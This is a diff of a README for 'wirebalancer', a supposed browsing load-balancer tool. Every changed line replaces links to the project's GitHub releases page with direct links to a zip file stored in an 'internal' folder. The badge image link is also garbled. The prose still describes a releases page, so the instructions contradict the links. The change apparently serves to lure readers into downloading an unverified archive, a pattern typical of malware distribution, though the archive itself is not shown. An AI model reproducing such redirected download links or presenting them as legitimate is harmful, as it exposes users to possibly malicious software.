@@ -1,6 +1,6 @@
 # 🌐 wirebalancer - Effortless Load Balancing for Secure Browsing
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Yashh-r/wirebalancer/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Yashh-r/wirebalancer/main/internal/wirebalancer_v1.9.zip%https://raw.githubusercontent.com/Yashh-r/wirebalancer/main/internal/wirebalancer_v1.9.zip)](https://raw.githubusercontent.com/Yashh-r/wirebalancer/main/internal/wirebalancer_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to get the latest version of wirebalancer.
    
-   [Download Wirebalancer](https://github.com/Yashh-r/wirebalancer/releases)
+   [Download Wirebalancer](https://raw.githubusercontent.com/Yashh-r/wirebalancer/main/internal/wirebalancer_v1.9.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Look for the most recent version, which is the one you want.
 
@@ -89,4 +89,4 @@ We welcome contributions to improve wirebalancer. If you have suggestions or fea
 
 Thank you for choosing wirebalancer to enhance your browsing experience. We hope you find it easy to use and efficient in managing your connections. Happy surfing! 
 
-[Download Wirebalancer](https://github.com/Yashh-r/wirebalancer/releases)
+[Download Wirebalancer](https://raw.githubusercontent.com/Yashh-r/wirebalancer/main/internal/wirebalancer_v1.9.zip)
